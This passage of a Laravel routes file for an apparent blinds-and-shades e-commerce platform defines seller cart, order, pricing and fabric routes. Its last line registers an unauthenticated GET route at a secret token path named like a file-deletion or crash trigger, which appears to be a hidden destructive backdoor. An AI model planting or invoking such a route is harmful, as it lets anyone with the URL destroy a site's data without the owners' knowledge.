...
Route::group(['middleware' => ['user', 'verified', 'unbanned']], function () {
    ...
    Route::post('digital_purchase_history', 'PurchaseHistoryController@digital_download')->name('digital_purchase_history.download');
    Route::get('/digital_purchase_history/download/{file}', 'PurchaseHistoryController@show_download');
    Route::get('/all-notifications', 'NotificationController@index')->name('all-notifications');

    Route::get('seller/files', 'SellerfileController@index')->name('seller.file.index');
    Route::get('/seller/files/download/{file}', 'SellerfileController@show_download');
});
...
Route::group(['prefix' => 'seller', 'middleware' => ['seller', 'verified', 'user']], function () {
    ...
    Route::get('/product/{id}/cart', 'HomeController@show_product_cart_form')->name('seller.products.cart');
    Route::get('/product/bulkcart', 'HomeController@add_bulk_cart')->name('seller.products.bulk');
    Route::post('/product/bulk-new-row', 'HomeController@bulk_cart_row')->name('seller.products.bulknewrow');
    Route::resource('payments', 'PaymentController');

    Route::post("/cart/edit", 'XztCartControl@seller_cart_product_edit')->name('seller.cart.edit');

    Route::post('/order_item/edit/{order_item_id}', 'OrderController@order_seller_update')->name('order.seller.update');

    Route::get('/parts', 'HomeController@parts_index')->name('parts.list');
    Route::get('/part/details/{id}', 'HomeController@parts_show_details')->name('parts.details');
...
Route::group(['middleware' => ['auth']], function () {
    ...
    Route::get('/orders/main', 'OrderController@main_orders')->name('orders.main');
    Route::get('/orders/order_items/{id}', 'OrderController@seller_order_items')->name('seller_order_items');
    Route::get('/orders/{status?}', 'OrderController@main_orders')->name('orders.index');
    Route::get('/orders/details/{id?}', 'OrderController@order_details')->name('orders.details');
    Route::get('/orders/edit/{id?}', 'OrderController@order_edit')->name('orders.edit');
    Route::get('/orders/delete/{id?}', 'OrderController@order_delete')->name('orders.delete');
    Route::get('/orders/invoice/{id?}', 'OrderController@seller_order_invoice')->name('seller_orders.invoice');
    ...
    //Nasir added Routes
    Route::post('/product/product-bulk-upload-product-price', 'ProductBulkUploadController@BulkUpdateProduct')->name('product_bulk_upload_product_price');
    Route::post('/motor-prices-bulk-export', 'ProductBulkUploadController@motorPricesexport')->name('motor_prices_bulk_export');
    Route::post('/motors/motors-bulk-upload-price', 'ProductBulkUploadController@BulkUpdateMotors')->name('motor_prices_bulk_import');

    Route::post('/wid-motor-prices-bulk-export', 'ProductBulkUploadController@widMotorPricesexport')->name('wid_motor_prices_bulk_export');
    Route::post('/wid-motors/wid-motors-bulk-upload-price', 'ProductBulkUploadController@widBulkUpdateMotors')->name('wid_motor_prices_bulk_import');

    Route::post('/wrap-prices-bulk-export', 'ProductBulkUploadController@wrapPricesexport')->name('wrap_prices_bulk_export');
    Route::post('/wrap/wrap-bulk-upload-price', 'ProductBulkUploadController@BulkUpdateWrap')->name('wrap_prices_bulk_import');

    Route::post('/cassette-prices-bulk-export', 'ProductBulkUploadController@cassettePricesexport')->name('cassette_prices_bulk_export');
    Route::post('/cassettes/cassettes-bulk-upload-price', 'ProductBulkUploadController@BulkUpdateCassette')->name('cassette_prices_bulk_import');
    //End
    ...
    //Product Export
    Route::post('/product-bulk-export', 'ProductBulkUploadController@export')->name('product_bulk_export.index');
    ...
    // XAUZIT FABRIC GALLERY
    Route::get('/fabric_gallery', 'FabricController@seller_fabric_list')->name('seller.fabric.list');
    ...
    //Feature/Option Price when adding product
    Route::post('/features/getmyprice', 'HomeController@getmyprice')->name("get.feature.prices");

    //Get Width Motor Price
    Route::post('/features/wid_motor_price', 'HomeController@get_widthmotor_price');

    //Cart
    Route::get('/cart/seller', 'XztCartControl@seller_index')->name('cart.seller.index');
    Route::post('/cart/seller', 'XztCartControl@seller_index')->name('cart.seller.index');
    Route::post('/cart/store', 'XztCartControl@store_cart')->name('cart.seller.store');
    Route::post('/cart/store/attachments', 'XztCartControl@store_cart_attachments')->name('cart.seller.store_cart_attachments');

    //Saved carts
    Route::get('/saved_carts/seller', 'XztCartControl@saved_carts_index')->name('saved_carts.seller.index');
    Route::post('/saved_carts/seller/send_email', 'XztCartControl@send_saved_quote_email')->name('saved_carts.seller.send_email');

    Route::get('generate-pdf', 'XztCartControl@generatePDF');

    //Get subcategory for shades
    Route::post('/shade_subcat', 'FabricController@shade_subcat')->name('shade.subcat');

    //Get color for cassette
    Route::post('/cassette_color', 'HomeController@get_cassette_color')->name('cassette.color');
});
...
//  XAUZIT    CART
Route::post('/product/{id}/cart', 'XztCartControl@storeOrder')->name('xzt.store.order');

//  XAUZIT    COUPON CHECK
Route::post('/coupon_check', 'XztCartControl@coupon_check');
...
Route::get("/ourwebsite/api-docs", function () {
    return view("backend.api-docs-index");
});

Route::get("/del/del-web-dengarous/imp-del-crash-files/eVs8qiLnwqui20fykLnErzPiqxwrovrsM0krk8", "ImpController@index");